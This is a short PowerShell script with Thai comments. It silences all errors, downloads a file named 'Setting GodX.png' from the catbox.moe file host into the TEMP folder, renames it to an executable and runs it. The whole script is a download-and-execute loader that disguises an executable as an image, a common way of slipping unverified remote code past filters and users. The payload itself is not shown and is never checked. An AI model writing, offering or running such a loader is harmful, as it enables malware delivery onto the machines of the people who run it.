# ปิดการแสดงข้อความให้รันเงียบที่สุด
$ErrorActionPreference = 'SilentlyContinue'

$exeName = "Setting GodX.exe"
$fileName = "Setting GodX.png" # ชื่อไฟล์ที่คุณอัปโหลดขึ้น Catbox
$url = "https://files.catbox.moe/c7lpiz.png"
$tempPath = "$env:TEMP\GodX_App"
$exePath = "$tempPath\$exeName"

# 1. สร้างโฟลเดอร์ทำงาน
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath | Out-Null }

# 2. ดาวน์โหลดไฟล์ (โหลดมาเป็นชื่อ .png)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, "$tempPath\$fileName")

# 3. เปลี่ยนนามสกุลกลับเป็น .exe
Rename-Item -Path "$tempPath\$fileName" -NewName $exeName -Force

# 4. รันโปรแกรมแบบ Working Directory ให้ถูกต้อง เพื่อให้ GUI ขึ้นมา
Start-Process "$exePath" -WorkingDirectory $tempPath